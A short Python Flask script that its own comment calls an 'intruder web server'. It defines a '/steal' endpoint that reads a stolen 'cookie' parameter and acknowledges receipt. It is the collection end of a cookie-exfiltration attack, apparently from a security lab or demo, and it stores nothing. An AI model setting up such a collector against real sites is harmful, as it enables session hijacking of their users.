from flask import Flask, request, jsonify



#######################Intruder web server, recieves a data and displays it on screen#######################



app = Flask(__name__ , static_folder='html')


@app.route('/steal', methods=['GET'])
def savedata():
    data = request.args.get('cookie')
    #print(data)
    return jsonify({"msg": "done"}),200


print("Starting Flask application...")

if __name__ == '__main__':
    app.run(host="0.0.0.0" , port=5001, debug=True) 
